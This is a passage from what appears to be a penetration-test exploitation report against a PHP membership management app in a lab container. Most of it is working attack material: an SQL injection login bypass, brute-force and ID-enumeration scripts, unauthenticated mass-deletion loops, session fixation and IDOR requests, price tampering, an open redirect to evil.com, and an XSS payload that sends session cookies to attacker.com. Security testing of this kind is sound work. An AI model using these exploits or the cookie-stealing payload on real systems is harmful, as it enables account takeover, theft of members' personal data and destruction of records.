- HTTP 200 on `dashboard.php` with session cookie from SQLi login
- Full member PII returned from `manage_members.php`: members `Demo Member`, `Demo Test`, `Demo NameUPD`, `Random Updated`, `Member A`, `Member C`, `Testing Member`, `Qwerty` — contact details, emails, addresses

**Underlying Vulnerable Code (`index.php:14`):**
```php
$email = $_POST['email'];
$hashed_password = md5($password);
$sql = "SELECT * FROM users WHERE email = '$email' AND password = '$hashed_password'";
```
The injected email `' OR '1'='1' -- -` transforms the query to:
`SELECT * FROM users WHERE email = '' OR '1'='1' -- - AND password = '...'`
This returns all rows; the first row populates the session.

---

### AUTH-VULN-04: Default Credentials Publicly Exposed — Direct Admin Login

**Summary:**
- **Vulnerable location:** `GET /uploads/01%20LOGIN%20DETAILS%20%26%20PROJECT%20INFO.txt` and `POST /index.php`
- **Overview:** The admin credentials (`admin@mail.com` / `codeastro.com`) are committed in plaintext to a file inside the web-accessible `uploads/` directory. Any unauthenticated visitor can download this file and immediately use the credentials to log in as admin.
- **Impact:** Complete account takeover of the sole admin account. Full application access without any brute force.
- **Severity:** Critical

**Prerequisites:** None — the credential file is publicly accessible with no authentication.

**Exploitation Steps:**

1. Download the publicly accessible credential file:
```bash
curl -s http://host.docker.internal:9010/uploads/01%20LOGIN%20DETAILS%20%26%20PROJECT%20INFO.txt
```
Response:
```
**Login Details**
Email   : admin@mail.com
Password: codeastro.com
```

2. Use the retrieved credentials to authenticate:
```bash
curl -si -X POST http://host.docker.internal:9010/index.php \
  -d "email=admin%40mail.com&password=codeastro.com&login=" \
  -c /tmp/cookies_vuln04.txt
```

3. Observe HTTP 302 redirect to `dashboard.php` and new admin session cookie:
```
HTTP/1.1 302 Found
Location: dashboard.php
Set-Cookie: PHPSESSID=695de6498af6cf0b676f046bd9438923; path=/
```

4. Use the session cookie to access the full admin dashboard:
```bash
curl -si http://host.docker.internal:9010/dashboard.php \
  -H "Cookie: PHPSESSID=695de6498af6cf0b676f046bd9438923"
```
Response: HTTP 200 with full authenticated admin dashboard.

**Proof of Impact:**
- HTTP 200 with credential file contents including plaintext password
- HTTP 302 login redirect confirming valid credentials accepted
- HTTP 200 on `dashboard.php` with admin session — full admin access achieved
- Member data retrieved from `/manage_members.php` — confirmed full application control

---

### AUTH-VULN-05: Weak MD5 Password Hashing — Hash Cracking via Public DB Dump

**Summary:**
- **Vulnerable location:** `GET /DATABASE%20FILE/membershiphp.sql` (public download) + `POST /index.php` (login)
- **Overview:** The application stores passwords as unsalted MD5 hashes (no work factor). The database dump is publicly accessible via the web server. An attacker can download the dump, extract the admin MD5 hash, and instantly reverse it via rainbow table lookup.
- **Impact:** Admin password recovery from hash. Immediate admin login. Even password changes remain vulnerable — all future MD5 hashes are trivially crackable.
- **Severity:** Critical

**Prerequisites:** None — the database dump is publicly accessible.

**Exploitation Steps:**

1. Download the publicly accessible database dump:
```bash
curl -s "http://host.docker.internal:9010/DATABASE%20FILE/membershiphp.sql" \
  | grep "INSERT INTO.*users"
```
Output:
```sql
INSERT INTO `users` (`id`, `email`, `password`, ...) VALUES
(1, 'admin@mail.com', 'f2d0ff370380124029c2b807a924156c', ...);
```

2. Reverse the MD5 hash (demonstrated via Python — equivalent to CrackStation.net lookup):
```python
import hashlib
hash_from_db = 'f2d0ff370380124029c2b807a924156c'
password = 'codeastro.com'
computed = hashlib.md5(password.encode()).hexdigest()
# Result: hash_from_db == computed  →  True
# Admin password: codeastro.com
```

3. Log in with the recovered password:
```bash
curl -si -X POST http://host.docker.internal:9010/index.php \
  -d "email=admin%40mail.com&password=codeastro.com&login="
```
Response: HTTP 302 redirect to `dashboard.php` — authenticated.

**Proof of Impact:**
- Hash `f2d0ff370380124029c2b807a924156c` confirmed to be `MD5("codeastro.com")` — verified match
- DB dump download confirmed (HTTP 200): contains schema and admin user record
- Successful admin login with hash-cracked password (HTTP 302 to dashboard)

---

### AUTH-VULN-03: Session Fixation — Pre-seeded Session ID Promotes to Admin After Login

**Summary:**
- **Vulnerable location:** `POST /index.php` — `session_regenerate_id()` never called
- **Overview:** The application never calls `session_regenerate_id()` after successful login. An attacker can capture a pre-login session ID (by requesting the login page), wait for or trick the admin into authenticating using that known session ID, and then immediately use the same session ID to access the application as the authenticated admin — without ever knowing the admin's password.
- **Impact:** Admin session hijacking. Full admin access obtained using a pre-planted session ID.
- **Severity:** High

**Prerequisites:** Ability to send the victim a URL or link that carries the attacker's known session ID (e.g., phishing link), OR the attacker can simply pre-seed the session and then log in themselves to prove the mechanism.

**Exploitation Steps:**

1. **Attacker:** Request the login page to obtain a fresh pre-login session ID:
```bash
PRE_SESSION=$(curl -si http://host.docker.internal:9010/index.php \
  | grep "Set-Cookie: PHPSESSID" \
  | sed 's/.*PHPSESSID=\([^;]*\).*/\1/' | tr -d '\r')
echo "Pre-login session ID: $PRE_SESSION"
# Example: cb8e1b1ba6fac2ee84cc3e05311f40bc
```

2. **Verify** the pre-login session ID does NOT grant dashboard access (HTTP 302 redirect away):
```bash
curl -si "http://host.docker.internal:9010/dashboard.php" \
  -H "Cookie: PHPSESSID=$PRE_SESSION"
# → HTTP/1.1 302 Found (redirects to login — not authenticated yet)
```

3. **Submit login** using the KNOWN pre-login session ID (simulating victim logging in via attacker-controlled link):
```bash
curl -si -X POST "http://host.docker.internal:9010/index.php" \
  -H "Cookie: PHPSESSID=$PRE_SESSION" \
  -d "email=admin%40mail.com&password=codeastro.com&login="
```
Response:
```
HTTP/1.1 302 Found
Location: dashboard.php
(No new Set-Cookie header — session ID was NOT rotated)
```

4. **Immediately use the pre-seeded session ID** to access the dashboard:
```bash
curl -si "http://host.docker.internal:9010/dashboard.php" \
  -H "Cookie: PHPSESSID=$PRE_SESSION"
```
Response:
```
HTTP/1.1 200 OK
[Full admin dashboard HTML rendered]
```

**Proof of Impact:**
- Pre-login session ID: `cb8e1b1ba6fac2ee84cc3e05311f40bc`
- Login response: HTTP 302, **zero `Set-Cookie` headers** in response — session not rotated
- Post-login check: HTTP 200 on `dashboard.php` with the ORIGINAL pre-login session ID
- Session fixation confirmed: attacker-known ID became a valid admin session after victim login

---

### AUTH-VULN-08: Missing Authentication on Sensitive Endpoints — Unauthenticated PII Access and Record Deletion

**Summary:**
- **Vulnerable location:** `GET /print_membership_card.php`, `GET /delete_members.php`, `GET /get_membership_amount.php`
- **Overview:** Three endpoints completely lack the `isset($_SESSION['user_id'])` authentication guard present on all other protected pages. Any unauthenticated HTTP request can access member PII (name, address, membership number) and permanently delete member records from the database.
- **Impact:** Full unauthenticated access to member PII. Unauthenticated permanent deletion of member records confirmed. Complete authentication bypass on critical destructive functionality.
- **Severity:** Critical

**Prerequisites:** None — no authentication required.

**Exploitation Steps (PII Enumeration):**

1. Access member PII without any session cookie:
```bash
curl -si "http://host.docker.internal:9010/print_membership_card.php?id=1"
```
Response: HTTP 200 with full membership card HTML including:
- Member name: `Demo NameUPD`
- Membership number: `CA-923020`
- Address: `123 Demo`
- Membership type: `Standard`

2. Enumerate all members by incrementing `id`:
```bash
for id in 1 4 5 6 9 10 11 12; do
  curl -s "http://host.docker.internal:9010/print_membership_card.php?id=$id" \
    | grep "emboss>" | grep -v "emboss2\|style\|Membership card"
done
```
All member PII returned without authentication.

**Exploitation Steps (Unauthenticated Record Deletion):**

1. Confirm target member exists via print_membership_card (no auth):
```bash
curl -si "http://host.docker.internal:9010/print_membership_card.php?id=14"
# Response: HTTP 200 with member name "PENTEST_VICTIM"
```

2. Delete the member record with no session cookie:
```bash
curl -si "http://host.docker.internal:9010/delete_members.php?id=14"
```
Response:
```
HTTP/1.1 302 Found
Location: manage_members.php
(No authentication required — DELETE SQL executed immediately)
```

3. Verify the member record was permanently deleted:
```bash
curl -si "http://host.docker.internal:9010/print_membership_card.php?id=14"
# Response: HTTP 302 (member gone — redirect to home)
```

**Proof of Impact:**
- HTTP 200 on `print_membership_card.php?id=1` with no `Cookie` header — full PII exposed
- Member `PENTEST_VICTIM` (ID 14): existed pre-deletion (HTTP 200), deleted via unauthenticated GET, confirmed deleted post-deletion (HTTP 302)
- `delete_members.php` executes cascading DELETE against both `renew` and `members` tables without any authentication

---

### AUTH-VULN-07: No Rate Limiting on Authentication Endpoint — Unrestricted Brute Force

**Summary:**
- **Vulnerable location:** `POST /index.php` (login), `POST /settings.php` (changePassword)
- **Overview:** No rate limiting, account lockout, CAPTCHA, or throttling mechanism exists anywhere in the application. An attacker can submit login attempts at full network speed indefinitely with zero countermeasures.
- **Impact:** Unlimited credential stuffing or brute force attacks. 479 requests/second demonstrated. Any password can be brute-forced given sufficient time — and combined with the MD5 hashing scheme, the server processes attempts extremely fast.
- **Severity:** High

**Prerequisites:** None — the login endpoint is publicly accessible.

**Exploitation Steps:**

1. Execute 42 rapid-fire login attempts against the endpoint (demonstrating no rate limiting):
```python
import urllib.request, urllib.parse, time

target = "http://host.docker.internal:9010/index.php"
passwords = ['admin', 'password', '123456', 'admin123', 'password123', 'letmein',
             'welcome', 'monkey', 'abc123', 'qwerty', 'dragon', 'sunshine',
             'master', 'shadow', 'pass123', 'hello', 'test', 'guest', 'root',
             'default', 'membership', 'codeastro', 'codeastro.com', 'CodeAstro',
             'membershiphp', 'mysql', 'rootpass', 'secret', 'changeme', 'pass',
             '111111', '12345', '123123', 'test123', 'demo', 'Admin123',
             'P@ssword', 'letmein!', 'pass@123', 'password1', '1234', 'qwerty123']

start = time.time()
for pwd in passwords:
    data = urllib.parse.urlencode({'email': 'admin@mail.com', 'password': pwd, 'login': ''}).encode()
    req = urllib.request.Request(target, data=data, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    try:
        resp = urllib.request.urlopen(req, timeout=5)
        status = resp.status
    except urllib.error.HTTPError as e:
        status = e.code
    print(f"password='{pwd}' | HTTP {status}")
print(f"Total: {len(passwords)} in {time.time()-start:.2f}s")
```

2. Observed results:
```
[0.00s] Attempt 001 | password='admin'         | HTTP 200 | FAILED
[0.01s] Attempt 002 | password='password'      | HTTP 200 | FAILED
[0.01s] Attempt 003 | password='123456'        | HTTP 200 | FAILED
...
[0.09s] Attempt 042 | password='qwerty123'     | HTTP 200 | FAILED

Total: 42 attempts in 0.09s
Rate: 479.8 requests/second
No HTTP 429, no lockout, no CAPTCHA, no throttle at any point
```

**Proof of Impact:**
- **479.8 requests/second** achieved against the login endpoint with zero rate limiting
- 42 consecutive failed attempts received HTTP 200 — no lockout, no throttle, no 429 response
- At this rate: a 10,000-entry password list is exhausted in ~21 seconds
- A full RockYou-derived 10M entry list is exhausted in ~5.8 hours — entirely undetectable from the server side

---

### AUTH-VULN-02: Session Cookie Misconfiguration — JavaScript-Accessible PHPSESSID

**Summary:**
- **Vulnerable location:** All pages — session cookie set by bare `session_start()` in `includes/config.php:14`
- **Overview:** The `PHPSESSID` session cookie is issued without `HttpOnly`, `Secure`, or `SameSite` flags. The absence of `HttpOnly` means JavaScript running in the browser can read the session cookie via `document.cookie`. This directly enables XSS-to-session-hijacking attack chains — any stored XSS (multiple confirmed in the application) can steal the admin's session token.
- **Impact:** Session token theft via XSS. Admin session cookie readable by any JavaScript executing on the page, enabling full session hijacking and persistent admin account takeover.
- **Severity:** High

**Prerequisites:** Any JavaScript execution in the admin's browser (e.g., via the multiple confirmed stored XSS vectors in the application).

**Exploitation Steps:**

1. Confirm cookie flags are absent from server response:
```bash
curl -si http://host.docker.internal:9010/index.php | grep -i "set-cookie"
```
Response:
```
Set-Cookie: PHPSESSID=1675f604cf38c042a50b9ffbba3ea8ae; path=/
```
Missing flags: `HttpOnly`, `Secure`, `SameSite`

2. Demonstrate JavaScript can read the PHPSESSID via browser eval:
```bash
playwright-cli -s=agent3 goto "http://host.docker.internal:9010/index.php"
playwright-cli -s=agent3 eval "document.cookie"
```
Result: `"PHPSESSID=1675f604cf38c042a50b9ffbba3ea8ae"`

The full session token is returned by `document.cookie`, confirming it is accessible to JavaScript.

3. **Attack chain** (XSS payload that would steal the cookie and send it to attacker):
```javascript
// Payload injected via any stored XSS vector (e.g., member fullname field)
var i = new Image();
i.src = 'http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
```
When admin views manage_members.php, the payload fires, sending the admin's `PHPSESSID` to the attacker.

4. Attacker replays the stolen cookie:
```bash
curl -si http://host.docker.internal:9010/dashboard.php \
  -H "Cookie: PHPSESSID=[STOLEN_PHPSESSID_VALUE]"
# → HTTP 200 with full admin dashboard
```

**Proof of Impact:**
- Live server response: `Set-Cookie: PHPSESSID=...; path=/` — zero security flags
- Browser eval: `document.cookie` returns full `PHPSESSID` value (confirmed via Playwright)
- Cookie is directly accessible to JavaScript; no `HttpOnly` barrier exists
- Combined with multiple confirmed stored XSS vectors in the application, this enables reliable admin session theft

---


# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-02: Unauthenticated Hard-Deletion of Any Member Record

**Summary:**
- **Vulnerable location:** `GET /delete_members.php?id={member_id}` — `delete_members.php` lines 30–57
- **Overview:** The active code path in `delete_members.php` contains zero authentication. Any unauthenticated visitor who issues a GET request with a valid (or brute-forced) integer `id` parameter triggers two irrecoverable SQL DELETEs: one against the `renew` table (all renewals for the member) and one against the `members` table (the member record itself). The 302 response to `manage_members.php` is identical whether the request comes from an authenticated admin or a completely unauthenticated internet visitor.
- **Impact:** Permanent, irreversible destruction of any member record and all associated renewal history by any unauthenticated attacker with network access to the application. Full database wipe achievable by enumerating sequential integer IDs (confirmed: IDs 1–15+ are in use).
- **Severity:** Critical

**Prerequisites:** None. No credentials, no session, no prior interaction required.

**Exploitation Steps:**

1. Identify a valid member ID by enumerating `GET http://host.docker.internal:9010/print_membership_card.php?id={N}` with no cookie (IDs 1, 4–7, 9–13, 15 confirmed active).

2. Issue a unauthenticated DELETE request:
   ```
   GET http://host.docker.internal:9010/delete_members.php?id=1
   Host: host.docker.internal:9010
   (No Cookie header)
   ```

3. Observe the response:
   ```
   HTTP/1.1 302 Found
   Location: manage_members.php
   ```
   The member record and all renewal records for id=1 are permanently deleted from the database.

4. Confirm deletion by requesting the (now-missing) membership card:
   ```
   GET http://host.docker.internal:9010/print_membership_card.php?id=1
   ```
   Returns HTTP 302 → `members_list.php` (record not found).

5. To enumerate and delete all members (mass deletion attack):
   ```python
   import urllib.request
   for member_id in range(1, 100):
       urllib.request.urlopen(
           f"http://host.docker.internal:9010/delete_members.php?id={member_id}"
       )
   ```

**Proof of Impact:**
- `GET http://host.docker.internal:9010/delete_members.php?id=9999` (no cookie) → HTTP 302 to `manage_members.php` — DELETE SQL executes unconditionally without any session check.
- Same response with a valid authenticated session: identical behavior confirms the auth gate is absent.
- 11 active member records (IDs 1, 4–7, 9–13, 15) confirmed via unauthenticated `print_membership_card.php` enumeration; all are deletable without credentials.

---

### AUTHZ-VULN-01: Unauthenticated Full PII Disclosure of All Member Records

**Summary:**
- **Vulnerable location:** `GET /print_membership_card.php?id={member_id}` — `print_membership_card.php` lines 4–9
- **Overview:** `print_membership_card.php` contains no `isset($_SESSION['user_id'])` check. The `id` GET parameter is used directly in a SQL JOIN to retrieve and render a fully detailed membership card HTML page. Any unauthenticated internet visitor who enumerates integer IDs receives full PII for every member in the system.
- **Impact:** Complete exfiltration of all member PII including full name, address, postcode, membership number, membership type, expiry date, and member photo URL — for every member in the database — without any authentication.
- **Severity:** Critical

**Prerequisites:** None. No credentials required.

**Exploitation Steps:**

1. Enumerate member IDs (no authentication):
   ```
   GET http://host.docker.internal:9010/print_membership_card.php?id=1
   Host: host.docker.internal:9010
   (No Cookie header)
   ```

2. Observe HTTP 200 response with full membership card HTML containing PII.

3. Enumerate all members with a simple loop:
   ```python
   import urllib.request
   for member_id in range(1, 1000):
       try:
           response = urllib.request.urlopen(
               f"http://host.docker.internal:9010/print_membership_card.php?id={member_id}"
           )
           if response.status == 200:
               print(f"ID {member_id}: {response.read().decode()[:200]}")
       except:
           pass  # redirect = no member at this ID
   ```

**Proof of Impact:**
Live unauthenticated enumeration of IDs 1–20 returned 11 complete membership cards with PII:

| Member ID | Membership # | Full Name | Type |
|-----------|-------------|-----------|------|
| 1 | CA-923020 | Demo NameUPD | Basic |
| 4 | CA-610243 | Qwerty | Gold |
| 5 | CA-373031 | Demo Test | Gold |
| 6 | CA-159695 | Member A | Silver |
| 7 | CA-992342 | Member B | Premium |
| 9 | CA-871386 | Random Updated | Gold |
| 10 | CA-519259 | Testing Member | Basic |
| 11 | CA-905203 | Member C | Standard |
| 12 | CA-053289 | Demo Member | Premium |
| 13 | CA-206191 | alert(1) | Basic |
| 15 | CA-463932 | alert(document.cookie) | Basic |

Each response includes: `membership_number`, `fullname`, `address`, `postcode`, `membership_type_name`, `expiry_date`, and a photo URL — all returned to a completely unauthenticated caller.

---

### AUTHZ-VULN-04: IDOR — Authenticated Session Can Overwrite Any Member Record

**Summary:**
- **Vulnerable location:** `POST /edit_member.php?id={member_id}` — `edit_member.php` lines 56–69
- **Overview:** The POST handler uses `$memberId = $_GET['id']` (line 15) without any ownership validation. Any authenticated session can POST member data to `/edit_member.php?id={N}` and overwrite any member's record in the database, regardless of which member the session "owns."
- **Impact:** Unauthorized modification of any member's PII: full name, date of birth, gender, contact number, email, address, country, postcode, occupation, and photo. Complete data integrity compromise.
- **Severity:** High

**Prerequisites:** A valid authenticated session (obtainable via the publicly known credentials `admin@mail.com` / `codeastro.com`, or via SQL injection authentication bypass).

**Exploitation Steps:**

1. Login to obtain a session cookie:
   ```
   POST http://host.docker.internal:9010/index.php
   Content-Type: application/x-www-form-urlencoded

   email=admin%40mail.com&password=codeastro.com&login=
   ```
   Capture the `PHPSESSID` value from the `Set-Cookie` response header.

2. Overwrite any member's record (targeting member ID 1):
   ```
   POST http://host.docker.internal:9010/edit_member.php?id=1
   Cookie: PHPSESSID=[SESSION_TOKEN]
   Content-Type: application/x-www-form-urlencoded

   fullname=ATTACKER_MODIFIED&dob=1995-11-10&gender=Male&contactNumber=9999999999&email=attacker@evil.com&address=Attacker+Address&country=AttackerCountry&postcode=99999&occupation=IDOR_CONFIRMED&update=
   ```
   Response: HTTP 302 → `manage_members.php`

3. Verify the modification by loading the member profile:
   ```
   GET http://host.docker.internal:9010/memberProfile.php?id=1
   Cookie: PHPSESSID=[SESSION_TOKEN]
   ```
   Response: HTTP 200 with `<p><strong>Full Name:</strong> ATTACKER_MODIFIED</p>`

**Proof of Impact:**
Live test confirmed: POST to `/edit_member.php?id=1` with `fullname=AUTHZ_TEST_MODIFIED` and `occupation=IDOR_CONFIRMED` returned HTTP 302. Subsequent GET `/memberProfile.php?id=1` confirmed `Full Name: AUTHZ_TEST_MODIFIED` in the response. Record was restored post-test. The modification was performed by the single admin session acting on its own member record — in a multi-user environment, any user's session could modify any other user's record.

---

### AUTHZ-VULN-03: IDOR — Any Authenticated Session Can Read Any Member's Full PII Profile

**Summary:**
- **Vulnerable location:** `GET /memberProfile.php?id={member_id}` — `memberProfile.php` lines 9–16
- **Overview:** `memberProfile.php` verifies `isset($_SESSION['user_id'])` (authentication present) but performs no ownership check. The `id` GET parameter is used directly to query any member record.
- **Impact:** Complete PII exfiltration for any member from any authenticated session: full name, DOB, gender, contact number, email, address, country, postcode, occupation, membership type, membership number, expiry date.
- **Severity:** High

**Prerequisites:** A valid authenticated session.

**Exploitation Steps:**

1. Login (same as AUTHZ-VULN-04 step 1).

2. Access any member profile by enumerating the `id` parameter:
   ```
   GET http://host.docker.internal:9010/memberProfile.php?id=1
   Cookie: PHPSESSID=[SESSION_TOKEN]
   ```

3. Response: HTTP 200 with full PII:
   ```
   Full Name: Demo NameUPD
   Date of Birth: 1995-11-10
   Gender: Male
   Contact Number: 4444444444
   Email: demo@mail.com
   Address: 123 Demo
   Country: DCountry
   Postcode: 4545
   Occupation: Test
   Membership Type: Standard
   ```

4. Enumerate all members:
   ```python
   for member_id in range(1, 100):
       response = requests.get(
           f"http://host.docker.internal:9010/memberProfile.php?id={member_id}",
           cookies={"PHPSESSID": "[SESSION_TOKEN]"}
       )
       # Parse PII from 200 responses
   ```

**Proof of Impact:**
Live test with session cookie returned HTTP 200 with complete PII for member ID 1. Without a session cookie, the same request returns HTTP 302 → `index.php` (confirming authentication is required, but no ownership check exists).

---

### AUTHZ-VULN-06: IDOR — Any Authenticated Session Can Modify Any Membership Type Pricing

**Summary:**
- **Vulnerable location:** `POST /edit_type.php` — `edit_type.php` lines 11–25
- **Overview:** The `edit_id` field in the POST body is taken directly from the request (`$id = $_POST['edit_id']`) and used to UPDATE any record in the `membership_types` table. No ownership check exists.
- **Impact:** Any authenticated user can change the name and price of any membership type, enabling financial fraud (setting all types to $0) or service disruption (corrupting membership tier data).
- **Severity:** High

**Prerequisites:** A valid authenticated session.

**Exploitation Steps:**

1. Login (same as AUTHZ-VULN-04 step 1).

2. Discover membership type IDs:
   ```
   GET http://host.docker.internal:9010/view_type.php
   Cookie: PHPSESSID=[SESSION_TOKEN]
   ```
   Returns 8 types: IDs 1 (Basic/$8), 2 (Standard/$13), 3 (Gold/$19), 4 (Silver/$15), 6 (Bronze/$12), 7 (Premium/$28), 10 (Premium2/$28), 11 (various).

3. Overwrite any membership type:
   ```
   POST http://host.docker.internal:9010/edit_type.php
   Cookie: PHPSESSID=[SESSION_TOKEN]
   Content-Type: application/x-www-form-urlencoded

   edit_id=7&membershipType=IDOR_TEST_TYPE&membershipAmount=999
   ```
   Response: HTTP 200 with "Membership type updated successfully!" message.

4. Verify via `GET /view_type.php`: type ID 7 now shows `IDOR_TEST_TYPE | $999`.

**Proof of Impact:**
Live test confirmed: POST with `edit_id=7&membershipType=IDOR_TEST_TYPE&membershipAmount=999` returned HTTP 200 with success message. GET `/view_type.php` confirmed row 7 updated. Record was restored post-test.

---

### AUTHZ-VULN-05: IDOR + Price Manipulation — Any Authenticated Session Can Renew Any Member's Membership

**Summary:**
- **Vulnerable location:** `GET/POST /renew.php?id={member_id}` — `renew.php` lines 14–48
- **Overview:** The `id` GET parameter has no ownership check (IDOR), and the `totalAmount` POST field is used directly from the client without server-side recalculation (price manipulation). Any authenticated user can renew any member's membership and record any arbitrary financial amount.
- **Impact:** Unauthorized renewal of any member's membership combined with financial record corruption (recording $0 or negative amounts for renewals that should cost up to $28+/month).
- **Severity:** High

**Prerequisites:** A valid authenticated session.

**Exploitation Steps:**

1. Login (same as AUTHZ-VULN-04 step 1).

2. Submit a renewal for any member with manipulated price:
   ```
   POST http://host.docker.internal:9010/renew.php?id=1
   Cookie: PHPSESSID=[SESSION_TOKEN]
   Content-Type: application/x-www-form-urlencoded

   membershipType=1&extend=12&totalAmount=0.00
   ```
   Response: HTTP 200 with "Membership renewed successfully."

3. This inserts into the `renew` table: `member_id=1, total_amount=0.00` for a 12-month renewal that should cost $96 (12 × $8 for Basic type).

**Proof of Impact:**
Live test: POST to `/renew.php?id=1` with `totalAmount=0.00` and `extend=12` returned HTTP 200 with success message. A 12-month renewal was recorded at $0.00 instead of the expected $96.

---

### AUTHZ-VULN-09: Client-Controlled Price Manipulation on Renewal Endpoint

**Summary:**
- **Vulnerable location:** `POST /renew.php` — `renew.php` line 37
- **Overview:** `$totalAmount = $_POST['totalAmount']` is inserted directly into the financial `renew` table with no server-side price recalculation. The `readonly` HTML attribute on the amount field is a client-side control only — trivially bypassed by sending the POST directly.
- **Impact:** Any authenticated user can corrupt the financial/revenue record by submitting arbitrary renewal amounts including $0.00, negative values, or inflated values, undermining revenue reporting and audit integrity.
- **Severity:** High

**Prerequisites:** A valid authenticated session.

**Exploitation Steps:**

1. Login to obtain session cookie.

2. Submit renewal with manipulated amount for own member:
   ```
   POST http://host.docker.internal:9010/renew.php?id=1
   Cookie: PHPSESSID=[SESSION_TOKEN]
   Content-Type: application/x-www-form-urlencoded

   membershipType=1&extend=12&totalAmount=0.00
   ```
   The `readonly` attribute on the HTML form field is irrelevant when the POST is crafted directly.

3. Confirm the $0.00 record was inserted by viewing revenue reports:
   ```
   POST http://host.docker.internal:9010/revenue_report.php
   Cookie: PHPSESSID=[SESSION_TOKEN]
   Content-Type: application/x-www-form-urlencoded

   fromDate=2020-01-01&toDate=2030-12-31
   ```

**Proof of Impact:**
Live test confirmed HTTP 200 "Membership renewed successfully" with `totalAmount=0.00` for a 12-month renewal (expected $96). No server-side price validation exists.

---

### AUTHZ-VULN-10: Password Change Accepts Any confirmPassword Value

**Summary:**
- **Vulnerable location:** `POST /settings.php` with `changePassword=1` — `settings.php` lines 44–72
- **Overview:** `$confirmPassword` is read at line 48 but never compared to `$newPassword`. The password update executes solely based on `currentPassword` matching — `confirmPassword` is an orphaned dead variable. Combined with the publicly available current password, this is a trivially exploitable authentication credential compromise.
- **Impact:** An attacker who knows the current password (publicly available in `/uploads/01 LOGIN DETAILS & PROJECT INFO.txt`) can change the admin password via a CSRF attack or direct POST. The `confirmPassword` field provides zero protection.
- **Severity:** High

**Prerequisites:** A valid authenticated session AND knowledge of the current password (publicly accessible at `http://host.docker.internal:9010/uploads/01%20LOGIN%20DETAILS%20%26%20PROJECT%20INFO.txt`).

**Exploitation Steps:**

1. Retrieve the current admin password (unauthenticated):
   ```
   GET http://host.docker.internal:9010/uploads/01%20LOGIN%20DETAILS%20%26%20PROJECT%20INFO.txt
   ```
   Returns plaintext file containing: `Password: codeastro.com`

2. Login to obtain session cookie:
   ```
   POST http://host.docker.internal:9010/index.php
   Content-Type: application/x-www-form-urlencoded

   email=admin%40mail.com&password=codeastro.com&login=
   ```

3. Change password with mismatched confirmPassword:
   ```
   POST http://host.docker.internal:9010/settings.php
   Cookie: PHPSESSID=[SESSION_TOKEN]
   Content-Type: application/x-www-form-urlencoded

   changePassword=1&currentPassword=codeastro.com&newPassword=NewAttackerPassword1&confirmPassword=DOES_NOT_MATCH_AT_ALL
   ```
   Response: HTTP 200 with password change success message.

4. Verify the password was changed:
   ```
   POST http://host.docker.internal:9010/index.php
   Content-Type: application/x-www-form-urlencoded

   email=admin%40mail.com&password=NewAttackerPassword1&login=
   ```
   Response: HTTP 302 → `dashboard.php` — login succeeds with new password.

**Proof of Impact:**
Live test: POST with `newPassword=TestHacked999` and `confirmPassword=DOES_NOT_MATCH_INTENTIONALLY` returned success. Subsequent login with `TestHacked999` succeeded (HTTP 302 → dashboard), confirming the password was changed despite the `confirmPassword` mismatch. Password was restored after testing.

---

### AUTHZ-VULN-07: IDOR — Any Authenticated Session Can Delete Any Membership Type

**Summary:**
- **Vulnerable location:** `GET /delete_membership.php?id={type_id}` — `delete_membership.php` lines 9–24
- **Overview:** No ownership check on the `id` GET parameter. Any authenticated user can permanently delete any membership type by enumerating integer IDs. Combined with an open redirect via the `Referer` header.
- **Impact:** Destruction of membership tier configuration (up to 8 types confirmed), breaking all member records associated with the deleted type. Open redirect enables post-deletion phishing.
- **Severity:** High

**Prerequisites:** A valid authenticated session.

**Exploitation Steps:**

1. Login to obtain session cookie.

2. Delete any membership type:
   ```
   GET http://host.docker.internal:9010/delete_membership.php?id=6
   Cookie: PHPSESSID=[SESSION_TOKEN]
   ```
   Response: HTTP 302 → (value of Referer header, or empty)

3. To combine with open redirect:
   ```
   GET http://host.docker.internal:9010/delete_membership.php?id=6
   Cookie: PHPSESSID=[SESSION_TOKEN]
   Referer: http://evil.com/fake-admin-login
   ```
   Response: HTTP 302 → `http://evil.com/fake-admin-login`
   The membership type is deleted AND the admin's browser is redirected to the attacker's phishing page.

**Proof of Impact:**
Live test with `id=999` (non-existent) and `Referer: http://evil.com/phishing`: HTTP 302 with `Location: http://evil.com/phishing` confirmed. The open redirect fires unconditionally from the `$_SERVER['HTTP_REFERER']` value. All 8 membership type IDs (1–4, 6, 7, 10, 11) confirmed via enumeration.

---

### AUTHZ-VULN-12: Open Redirect via Unvalidated HTTP Referer Header

**Summary:**
- **Vulnerable location:** `GET /delete_membership.php` — `delete_membership.php` lines 14–22
- **Overview:** Both the success branch (line 15) and fallback branch (line 22) execute `header("Location: ".$_SERVER['HTTP_REFERER'])` with no URL validation. The HTTP `Referer` request header is entirely attacker-controlled.
- **Impact:** An authenticated user who clicks a malicious link to `/delete_membership.php?id={N}` will have their browser redirected to the attacker's chosen URL after the membership type is deleted. Enables phishing, credential harvesting, and drive-by download attacks.
- **Severity:** Medium

**Prerequisites:** A valid authenticated session (victim must be logged in when they follow the crafted link).

**Exploitation Steps:**

1. Craft a URL with a malicious Referer. In a CSRF/phishing attack, embed this in an `<img>` or `<a>` on an attacker-controlled page:
   ```html
   <!-- On attacker's page: -->
   <img src="http://host.docker.internal:9010/delete_membership.php?id=1"
        referrerpolicy="unsafe-url">
   <!-- Browser automatically includes attacker's page URL as Referer -->
   ```

2. Or directly (e.g., via curl):
   ```
   GET http://host.docker.internal:9010/delete_membership.php?id=1
   Cookie: PHPSESSID=[SESSION_TOKEN]
   Referer: http://evil.com/fake-login-page
   ```

3. Server response:
   ```
   HTTP/1.1 302 Found
   Location: http://evil.com/fake-login-page
   ```

**Proof of Impact:**
Live test confirmed: `GET /delete_membership.php?id=999` with `Referer: http://evil.com/credential-harvest` returns HTTP 302 with `Location: http://evil.com/credential-harvest`. The server echoes the attacker-controlled Referer header directly into the Location response header without any validation.

---

### AUTHZ-VULN-08: Unauthenticated Access to Membership Pricing API

**Summary:**
- **Vulnerable location:** `GET /get_membership_amount.php?membershipTypeId={id}` — `get_membership_amount.php` lines 9–23
- **Overview:** No authentication check exists. Any unauthenticated visitor can query membership type pricing by enumerating the `membershipTypeId` parameter.
- **Impact:** Unauthenticated enumeration of all membership pricing data. More significantly, this endpoint also represents an unauthenticated SQL injection vector (no parameterized query).
- **Severity:** Medium

**Prerequisites:** None. No credentials required.

**Exploitation Steps:**

1. Query membership pricing without authentication:
   ```
   GET http://host.docker.internal:9010/get_membership_amount.php?membershipTypeId=1
   Host: host.docker.internal:9010
   (No Cookie header)
   ```

